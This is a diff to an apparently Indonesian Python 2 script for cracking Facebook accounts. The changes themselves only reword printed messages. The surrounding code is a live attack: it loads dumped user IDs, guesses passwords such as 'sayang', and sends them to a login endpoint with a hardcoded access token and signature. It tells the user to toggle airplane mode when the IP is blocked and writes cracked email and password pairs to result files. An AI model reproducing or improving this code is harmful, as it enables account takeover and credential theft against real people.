@@ -312,7 +312,7 @@ class ngentod:
             self.id = open(self.apk).read().splitlines()
             print '%s%s%s jumlah Id%s > %s%s' %(U,til,O,M,H,len(self.id))
         except:
-            print '\n%s%s file dump :%s tidak ada '%(M,til,self.apk);jeda(3);menu()
+            print '\n%s%s file dump :%s tidak ada\n%s%s lo harus dump id dlu lah '%(M,til,self.apk,M,til);jeda(3);menu()
         rom = raw_input('%s%s%s gunakan password manual? y/t%s > %s'%(U,til,O,M,K))
         if rom in ('Y', 'y'):
             print ('\n%s%s%s contoh%s >%s sayang%s,%spengen%s,%sngentot'%(U,til,O,M,O,M,O,M,O))
@@ -398,7 +398,7 @@ class ngentod:
             params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
             send = requests.get(api, params=params, headers=headers_)
             if send.status_code != 200:
-            	print "\r\033[0;91m• IP anda terblokir. hidupkan mode pesawat 2 detik",
+            	print ("\r\033[0;91m• IP terkena spam. hidupkan mode pesawat 2 detik"),
                 sys.stdout.flush()
                 loop +=1
                 api(self, user, xxh)
@@ -424,7 +424,7 @@ class ngentod:
                     lahir = ''
                 except:
                     pass
-                print '\r  %s*--> %s ◊ %s           ' % (K,user,pw)
+                print '\r %s*--> %s ◊ %s           ' % (K,user,pw)
                 wrt = ' *--> %s ◊ %s' % (user,pw)
                 cp.append(wrt)
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
